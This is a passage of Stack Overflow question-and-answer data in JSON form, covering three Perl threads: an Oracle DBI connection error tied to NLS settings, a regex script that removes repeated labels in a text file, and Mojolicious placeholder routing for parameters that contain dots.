without:</p>\n\n<pre><code>$ENV{OCI_NLS_CHARSET_ID} = \"AMERICAN_AMERICA.CL8MSWIN1251\";\n$ENV{ORACLE_HOME} = \"path\";\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 4491821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d25f5f1781a832ed5e534a3ee38a32db?s=128&d=identicon&r=PG&f=1", "display_name": "Ayrat Salavatovich", "link": "https://stackoverflow.com/users/4491821/ayrat-salavatovich"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1049, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1462881224, "creation_date": 1462871321, "last_edit_date": 1462877823, "question_id": 37133941, "link": "https://stackoverflow.com/questions/37133941/dbi-connect-failed-error-ocinlsenvironmentvariablegetoci-nls-charset-id", "title": "DBI connect failed: ERROR OCINlsEnvironmentVariableGet(OCI_NLS_CHARSET_ID)", "body": "<p>I'm trying to connect to a remote Oracle database in my perl app. When running the app, the following error appears:</p>\n\n<pre><code>DBI connect('//XXX.XXX.XXX.XXX:1522/TEST','user','password') \nfailed: ERROR OCINlsEnvironmentVariableGet(OCI_NLS_CHARSET_ID)\nCheck NLS settings etc. at App.pm line 28.\n</code></pre>\n\n<p>My App.pm</p>\n\n<pre><code>package App;\n\nuse strict;\nuse warnings;\n\nuse DBI;\n\nmy $instance = undef;\nBEGIN {\n    $ENV{OCI_NLS_CHARSET_ID} = \"AMERICAN_AMERICA.CL8MSWIN1251\";\n    $ENV{ORACLE_HOME} = \"path\";\n}\nsub get_instance {\n    $instance = bless {}, shift unless $instance;\n    return $instance;\n}\n\nsub new {\n    my ($caller) = @_;\n    my $class = ref($caller) || $caller;\n    return get_instance($class);\n}\n\nsub connect {\n    my $self = shift;\n    $self-&gt;{dbh} = DBI-&gt;connect('dbi:Oracle://XXX.XXX.XXX.XXX:1522/TEST', 'user', 'password');\n}\n\nsub DESTROY {\n    my $self = shift;\n    $self-&gt;{dbh}-&gt;disconnect if $self-&gt;{dbh};\n}\n\n1;\n</code></pre>\n\n<p>NLS_PARAMETERS:</p>\n\n<pre><code>PARAMETER                                                        VALUE\n---------------------------------------------------------------- ----------------------------------------------------------------\nNLS_LANGUAGE                                                     AMERICAN\nNLS_TERRITORY                                                    AMERICA\nNLS_CURRENCY                                                     $\nNLS_ISO_CURRENCY                                                 AMERICA\nNLS_NUMERIC_CHARACTERS                                           .,\nNLS_CALENDAR                                                     GREGORIAN\nNLS_DATE_FORMAT                                                  DD-MON-RR\nNLS_DATE_LANGUAGE                                                AMERICAN\nNLS_CHARACTERSET                                                 CL8MSWIN1251\nNLS_SORT                                                         BINARY\nNLS_TIME_FORMAT                                                  HH.MI.SSXFF AM\nNLS_TIMESTAMP_FORMAT                                             DD-MON-RR HH.MI.SSXFF AM\nNLS_TIME_TZ_FORMAT                                               HH.MI.SSXFF AM TZR\nNLS_TIMESTAMP_TZ_FORMAT                                          DD-MON-RR HH.MI.SSXFF AM TZR\nNLS_DUAL_CURRENCY                                                $\nNLS_NCHAR_CHARACTERSET                                           AL16UTF16\nNLS_COMP                                                         BINARY\nNLS_LENGTH_SEMANTICS                                             BYTE\nNLS_NCHAR_CONV_EXCP                                              FALSE\n\n19 rows selected\n</code></pre>\n\n<p>I'm using ActiveStat perl on Windows 7. \nServer ORACLE 11.2.0.2.0 x64 on Windows 2003. \nDBI 1.634. \nDBI-Oracle 1.74.</p>\n\n<p>On server, application is running successfully.</p>\n"}, {"tags": ["regex", "perl", "text", "replace"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462871158, "post_id": 37133624, "comment_id": 61806889, "body": "Do you want to keep the text as well?  How do you want to ogranize output?"}, {"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462871416, "post_id": 37133624, "comment_id": 61807055, "body": "Yes, the rest of the text has to be kept (I just edited the post to make it clearer).  The output should be kept the way it is organized, there are a number of other replacement operations that I run on the text, but no lines are deleted."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462871490, "post_id": 37133624, "comment_id": 61807107, "body": "OK. So the lines with duplicate labels just literally lose the label and everything else stays the same?"}, {"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462873795, "post_id": 37133624, "comment_id": 61808802, "body": "It does work!!! Great, thanks so much for the prompt solution!  -- Just one more thing:  I&#39;d like to get rid of the hashtag too (which is part of the label)."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462874363, "post_id": 37133624, "comment_id": 61809226, "body": "Fixed. Since nothing depended on that regex (other than deletion) it was as simple as moving the <code>#</code> into the non-capturing group.  Then the replacement doesn&#39;t put it back.  Let me know if more comes up."}], "answers": [{"comments": [{"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1462875751, "post_id": 37134486, "comment_id": 61810227, "body": "Yes it works now (I might have copied something wrong).  One more question: Where should I put the rest of my regexes (to be processed after the label replacement)?  I tried to put the <code>LINE: while ...</code> sequence before the <code>print</code> command but it gives me an error."}, {"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1462877479, "post_id": 37134486, "comment_id": 61811417, "body": "OK, no worries, I&#39;ll play around with it.  It&#39;s not urgent.  I&#39;ve now put the <code>s&#47;</code> patterns in the loop (before the print) but get a <code>Use of uninitialized value $_ in substitution (s&#47;&#47;&#47;)</code> error?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 1, "creation_date": 1462910380, "post_id": 37134486, "comment_id": 61833666, "body": "@jan  Changed and rearranged the code.  Now it starts with a version that processes line-by-line.  You should be able to literally copy your regexes (and whatever other processing you have), to where it says &quot;process ...&quot;. It still gives you two options: where label and non-label lines are distinguished, or not. Then it shows what change in code to make if you wish to do per-block processing (that was the original post).  It&#39;s all been tested.  Please let me know how it goes."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 1, "creation_date": 1462910598, "post_id": 37134486, "comment_id": 61833759, "body": "@jan  The error you were getting was because your regex uses the default <code>$_</code> while I had had a named variable <code>$bl</code>.  I changed that around as well so that you can simply copy your code.  In principle I do recommend using properly named variables, specially in complex processing that calls <code>$_</code> often.  The code&#39;s often just clearer that way."}, {"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1462957655, "post_id": 37134486, "comment_id": 61852035, "body": "Excellent, thank you so much!   First and second versions work fine.  I&#39;m using the second solution since other replacements search both, label and no-label lines.  In the first version I tested putting these other replacements at the beginning, before the block with labels starts, and it worked as well.  When would one be preferred over the other?   (I didn&#39;t get the processing in blocks to work, despite changing $_ to $bl but I&#39;m happy with what I&#39;ve got!)"}, {"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1462963748, "post_id": 37134486, "comment_id": 61856250, "body": "May I ask you two more questions?  I&#39;m trying to print a string at the beginning and at the end of the file.  Doing <code>s&#47;^^&#47;mystring&#47;;</code> prints it at each line.  Where do I put it?   \u2013  And: how would I pass a currently selected file as variable to the perl script?  (or would that merit a separate question?)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1462990169, "post_id": 37134486, "comment_id": 61875436, "body": "@jan (1) That regex is a substition at the beginning of a line, that works on the default parameter <code>$_</code>.  So it will do it at the beginning of each line as <code>$_</code> is set to a new line.  (I don&#39;t know what the double <code>^^</code> does exactly, if anything.)  If the string has nothing to do with the file contents, just print it before <code>while</code> -- before you start iterating over lines.  Do <code>print $out &quot;string\\n&quot;;</code>. Then do the same after the <code>while</code> finishes.  Your lines are processed inside <code>while</code>, but the <code>$out</code> refers to the file everywhere. (2) What do you mean by &quot;currently selected&quot; file?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1462990675, "post_id": 37134486, "comment_id": 61875726, "body": "@jan My comment above is about <i>adding</i> a string to the top of the file.  If the string is to be at the beginning of the existing first line of the file let me know."}, {"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1463020653, "post_id": 37134486, "comment_id": 61887169, "body": "Yes that&#39;s what I wanted! Thank you.  \u2013 By &quot;selected file&quot; I was referring to a file in the Finder, in order to be able to call this script from the GUI by embedding it in an AppleScript for example, via a <code>do shell script &quot;.&#47;myscript.pl -i inputFile -o outputFile</code> where input and output Files are variables that I get from the AppleScript.  How do I make sure that the perl scrips understands these variables?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1463021544, "post_id": 37134486, "comment_id": 61887385, "body": "@jan  OK, I dont&#39; know anything about the particular AppleScript integration.  However, if you do have the variable to pass to your script like <code>myscript.pl -i inputFile</code>, then you want to look at the excellent module <a href=\"http://perldoc.perl.org/Getopt/Long.html\" rel=\"nofollow noreferrer\"><code>Getopt::Long</code></a>, which provides great interface for handling <i>command line options</i>.  There are posts around here about how to use it. I&#39;ll look for some and send links."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1463021860, "post_id": 37134486, "comment_id": 61887450, "body": "@jan  I see your comment about versions only now.  I&#39;d say: if all lines are processed the same way, better pre-process the label at one place and then you have a clean slate.  If the processing of lines differs, then it may make sense to use the version that already splits those cases.  As for blocks ... imagine you have a pattern/sentence/etc that spreads over the block.  Or, some other target where you need to look at the whole block.  That&#39;s when it is nice to have the block in a variable. (Keep in mind that there are newlines in the block as well.)  Otherwise, go line-by-line."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1463022038, "post_id": 37134486, "comment_id": 61887488, "body": "@jan I started with block because at first I thought that it would be a good way to do what you need. Then it turned out unnecessary.  I kept it in the end just so, since it may be good to know about that possibility."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1463028588, "post_id": 37134486, "comment_id": 61889190, "body": "@jan  Glad to hear that. As for Getopt, all I can readily find here is my own <a href=\"http://stackoverflow.com/questions/35661880/read-optional-command-line-arguments-in-perl/35661939#35661939\">post here</a>, which summarizes common usage.  Here is also a <a href=\"http://www.perlmonks.org/?node_id=455158\" rel=\"nofollow noreferrer\">hands-on post</a> on perlmonks, where the first and specially second answer seem to be helpful.  Finally, I&#39;d suggest that we tidy up this thread, remove your comments that you don&#39;t need here and then I&#39;ll do the same."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1463030093, "post_id": 37134486, "comment_id": 61889726, "body": "@jan That&#39;s fine. These threads do get cleaned up occasionally if needed.  If anything else pops up please let me know. Thank you for nice interaction."}, {"owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "edited": false, "score": 0, "creation_date": 1463030234, "post_id": 37134486, "comment_id": 61889762, "body": "Thanks so much for all your help!"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1462910185, "last_edit_date": 1462910185, "creation_date": 1462872739, "answer_id": 37134486, "question_id": 37133624, "link": "https://stackoverflow.com/questions/37133624/replace-repetitions-of-specific-text-with-perl-script/37134486#37134486", "title": "Replace repetitions of specific text with perl script", "body": "<p>Introduce the 'current label' -- the latest one picked up -- and keep track of it. Once a line with a label comes up compare: if it is the same it repeats so delete it, otherwise replace it and we have the new 'current' one.</p>\n\n<p>The processing goes line-by-line. Alternatively, one can read a whole block at a time to enable per-block processing, which may be more convenient. Code for this is shown at the end.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nopen my $fh_out, '&gt;', 'new_text_label.txt';\nopen my $fh_in, '&lt;', 'text_label.txt';\n\n# Our current (running) label\nmy $curr_label = '';\n\nwhile (&lt;$fh_in&gt;)  \n{\n    # If line with label fetch it otherwise (print and) skip\n    my ($label) = $_ =~ m/txt@#(\\w+)/;\n    if (not $label) {\n        # ... process non-label line as needed ...\n        print $fh_out $_;\n        next;\n    }       \n    # Delete if repeated (matching the current), reset if new\n    if ($curr_label eq $label) {\n        s/(txt@)(?:#\\w+)(.*)/$1$2/;\n    }   \n    else {\n        $curr_label = $label;\n    }   \n    # ... process label-line as needed ...\n    print $fh_out $_;\n}\n</code></pre>\n\n<p>This yields the required file.  Processing of lines with or without a label is separate, which may be good if further processing differs for them.  Or, the pre-processing of the label-line can be all done in one place, which is better if further processing does not distinguish between lines with or without a label.</p>\n\n<pre><code>while (&lt;$fh_in&gt;) \n{\n     # If this is the label line, process it: delete or replace the label\n     if (my ($label) = $_ =~ m/txt@#(\\w+)/) {\n        # Delete if repeated (matching the current), reset if new\n        if ($curr_label eq $label) {\n            s/(txt@)(?:#\\w+)(.*)/$1$2/;\n        }   \n        else {\n            $curr_label = $label;\n        }\n     }\n     # The label is now fixed as needed. Process lines normally ...\n     print $fh_out $_;\n}\n</code></pre>\n\n<p>This replaces the <code>while</code> loop above, the rest of the code is the same.</p>\n\n<hr>\n\n<p><em>Derived from what was originally posted, commented</em></p>\n\n<p>Here are changes in the code so that it reads the whole block at a time, which is good for processing that can make use of having the whole block of text in the variable. Note that a block contains new lines (so regexes may need <code>/s</code> etc). To enable possible bulk processing all blocks are first read into an array as well.</p>\n\n<pre><code>my @blocks = do { \n    # Set record separator to empty line to read blocks\n    local $/ = \"\\n\\n\";\n    open my $fh_in, '&lt;', 'text_label.txt';\n    &lt;$fh_in&gt;;    \n};\n\n# Our current (running) label\nmy $curr_label = '';\n\nforeach my $bl (@blocks) \n{\n     # The label pre-processing is exactly the same as above\n     # Other processing can now utilize having the whole block in $bl\n}\n</code></pre>\n"}], "owner": {"reputation": 249, "user_id": 5814380, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cc5247afa42014a646feaf185d52c6e2?s=128&d=identicon&r=PG&f=1", "display_name": "jan", "link": "https://stackoverflow.com/users/5814380/jan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "accepted_answer_id": 37134486, "answer_count": 1, "score": 1, "last_activity_date": 1462910185, "creation_date": 1462870544, "last_edit_date": 1462871329, "question_id": 37133624, "link": "https://stackoverflow.com/questions/37133624/replace-repetitions-of-specific-text-with-perl-script", "title": "Replace repetitions of specific text with perl script", "body": "<p>I have a simple perl script that does a number of text replacements along the following lines:</p>\n\n<pre><code>#!/usr/bin/perl\n{\nopen(my $in, \"&lt;\", \"Texts.txt\") or die \"No input: $!\";\nopen(my $out, \"&gt;\",  \"TeXed/Texts.tex\") or die \"No output directory: $!\";\nLINE: while (&lt;$in&gt;) {\n    s/(txt@)(.*)(?&lt;!\\t|\\[)\\[(.*)/\\1\\2\\\\ovl{}\\3/g;# \n    # there are a bunch of other replacements like the above\n    print $out $_ ; \n    }\n}\n</code></pre>\n\n<p>So far so good. The text I am running this script on is organized into blocks (not always of the same length). Each block starts with the same identifier (txt@) and then a unique label. Every label starts with a #.<br>\nWhat I would like to achieve is to delete all repeated labels \u2013 essentially I only want to keep every first instance of a label and replace/delete all subsequent ones until the label changes. In the below example the ones to be replaced/deleted are in <strong>bold</strong>.  </p>\n\n<p>txt@#Label1 some text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>txt@#<strong>Label1</strong> some other text<br>\nsome more text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>txt@#<strong>Label1</strong> some random text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>txt@#Label2 some text<br>\nsome more text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>txt@#Label1 some text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>txt@#Label3 some text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>txt@#<strong>Label3</strong> some text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>txt@#Label1 some text<br>\nsome more text<br>\nsome more text  </p>\n\n<p>etc.</p>\n\n<p>Sorry for the long example \u2013 I couldn't come up with a better way of explaining this. </p>\n\n<p>So I want to delete all repeated Label1, Label2, etc., but without modifying the rest of the text (some text, some more text) both on the same line but also on subsequent lines. The number of subsequent lines is not always the same (so it's not every n-th line that has to be replaced).</p>\n\n<p>Is that possible with perl?  Or any other way?  (I'm not married to perl, if it is easier with another language I'd be happy to try that \u2013 I'm not a programmer though so detailed instructions would be highly appreciated). </p>\n"}, {"tags": ["perl", "mojolicious"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1463437290, "post_id": 37133551, "comment_id": 62055088, "body": "I don&#39;t get it. Why do you say an email address like <code>email@email.com</code> has a colon?"}, {"owner": {"reputation": 3173, "user_id": 1414508, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/98da6c6514e44b8981090ba1e647226b?s=128&d=identicon&r=PG", "display_name": "Iliya Reyzis", "link": "https://stackoverflow.com/users/1414508/iliya-reyzis"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1463472331, "post_id": 37133551, "comment_id": 62066928, "body": "sorry, I meant dot (<code>.</code>)"}], "answers": [{"comments": [{"owner": {"reputation": 3173, "user_id": 1414508, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/98da6c6514e44b8981090ba1e647226b?s=128&d=identicon&r=PG", "display_name": "Iliya Reyzis", "link": "https://stackoverflow.com/users/1414508/iliya-reyzis"}, "edited": false, "score": 0, "creation_date": 1463571136, "post_id": 37278138, "comment_id": 62119221, "body": "I just realized the concept of the placeholders and the custom pattern now, I just didn&#39;t approached it the right way. Thank you."}, {"owner": {"reputation": 222, "user_id": 6265747, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58f4f310cf0e2c351807a21290825e7c?s=128&d=identicon&r=PG&f=1", "display_name": "Bianca", "link": "https://stackoverflow.com/users/6265747/bianca"}, "edited": false, "score": 0, "creation_date": 1508830534, "post_id": 37278138, "comment_id": 80756086, "body": "What can you use when the parameter may start with a dot? It seems wildcard placeholders don&#39;t work in that case"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": true, "score": 7, "last_activity_date": 1463493101, "creation_date": 1463493101, "answer_id": 37278138, "question_id": 37133551, "link": "https://stackoverflow.com/questions/37133551/mojolicious-disable-dot-placeholder-routing/37278138#37278138", "title": "mojolicious disable dot placeholder routing", "body": "<p>Mojolicious supports three kinds of placeholder parameters:</p>\n\n<p><a href=\"http://mojolicious.org/perldoc/Mojolicious/Guides/Routing#Standard-placeholders\" rel=\"noreferrer\">Standard</a></p>\n\n<pre><code>my $foo = $r-&gt;get('/foo/:asd')-&gt;to('Foo#bar');\n</code></pre>\n\n<p><a href=\"http://mojolicious.org/perldoc/Mojolicious/Guides/Routing#Relaxed-placeholders\" rel=\"noreferrer\">Relaxed</a></p>\n\n<pre><code>my $foo = $r-&gt;get('/foo/#asd')-&gt;to('Foo#bar');\n</code></pre>\n\n<p><a href=\"http://mojolicious.org/perldoc/Mojolicious/Guides/Routing#Wildcard-placeholders\" rel=\"noreferrer\">Wildcards</a></p>\n\n<pre><code>my $foo = $r-&gt;get('/foo/*asd')-&gt;to('Foo#bar');\n</code></pre>\n\n<p>Standard placeholders can match all characters except <code>.</code> and <code>/</code> .\nRelaxed placeholders can match all characters except <code>/</code>.\nWildcard placeholders can match all characters. So if you want to support parameter values with <code>.</code> or <code>/</code>, you must use the relaxed or wildcard style placeholders.</p>\n"}], "owner": {"reputation": 3173, "user_id": 1414508, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/98da6c6514e44b8981090ba1e647226b?s=128&d=identicon&r=PG", "display_name": "Iliya Reyzis", "link": "https://stackoverflow.com/users/1414508/iliya-reyzis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 431, "favorite_count": 1, "accepted_answer_id": 37278138, "answer_count": 1, "score": 3, "last_activity_date": 1463493101, "creation_date": 1462870376, "last_edit_date": 1463472373, "question_id": 37133551, "link": "https://stackoverflow.com/questions/37133551/mojolicious-disable-dot-placeholder-routing", "title": "mojolicious disable dot placeholder routing", "body": "<p><strong>Background</strong></p>\n\n<p>I have this routing</p>\n\n<p><code>my $foo = $r-&gt;get('/foo/:asd')-&gt;to('Foo#bar');</code></p>\n\n<p>in the controller I'm just rendering some json with the passed param\n(with the help of <code>Mojolicious::Controller::REST</code>)</p>\n\n<p><code>$self-&gt;data( 'param' =&gt; $self-&gt;param('asd') );</code></p>\n\n<p><br></p>\n\n<p><strong>The Problem</strong></p>\n\n<p>When sending a request to <code>/foo/bar</code>, its working as expected:</p>\n\n<p><code>{\"data\":{\"param\":\"bar\"}}</code></p>\n\n<p>but when I'm trying to pass a string that is containing a <code>dot</code>, an email for example (email@email.com), mojo is rendering the <code>dot</code> as a <code>slash</code>. The routing I defined in the first place is not longer relevant, because now the pattern has changed to <code>foo/:bar/:baz</code></p>\n\n<p><br></p>\n\n<p><strong>The Solution</strong></p>\n\n<p>I was told that the solution is around here:\n<a href=\"https://github.com/kraih/mojo/blob/master/t/mojolicious/routes.t#L218\" rel=\"nofollow\">https://github.com/kraih/mojo/blob/master/t/mojolicious/routes.t#L218</a> <br>\nIt make sense, but 